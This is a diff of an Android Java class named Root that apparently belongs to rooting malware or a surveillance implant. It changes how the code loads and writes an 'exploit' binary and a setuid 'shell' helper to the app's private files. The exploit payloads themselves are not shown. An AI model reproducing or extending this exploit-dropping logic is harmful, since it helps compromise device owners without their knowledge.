@@ -95,12 +95,11 @@ public class Root {
 			return;
 		}
 
-		Resources resources = Status.getAppContext().getResources();
 		// exploit
 		// InputStream stream = resources.openRawResource(R.raw.statuslog);
 
 		// suidext
-		InputStream stream = resources.openRawResource(R.raw.statusdb);
+		InputStream stream = Utils.getAssetStream("s.bin");
 
 		try {
 			// 0x5A3D10448D7A912A
@@ -274,23 +273,23 @@ public class Root {
 			// Creiamo il crashlog
 			final FileOutputStream fos = Status.getAppContext().openFileOutput(crashlog, Context.MODE_PRIVATE);
 			fos.close();
-
-			Resources resources = Status.getAppContext().getResources();
-
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (root): saving statuslog"); //$NON-NLS-1$
 			}
 			
-			InputStream stream = resources.openRawResource(R.raw.statuslog);
+			// exploit
+			InputStream stream = Utils.getAssetStream("e.bin");
 
 			// "0x5A3D10448D7A912B"
 			Root.fileWrite(exploit, stream, Cfg.RNDLOG);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (root): saving statusdb"); //$NON-NLS-1$
+				Check.log(TAG + " (root): saving exploit e.bin"); //$NON-NLS-1$
 			}
 			
-			stream = resources.openRawResource(R.raw.statusdb);
+			// shell
+			stream = Utils.getAssetStream("s.bin");
 
 			// 0x5A3D10448D7A912A
 			Root.fileWrite(suidext, stream, Cfg.RNDDB);
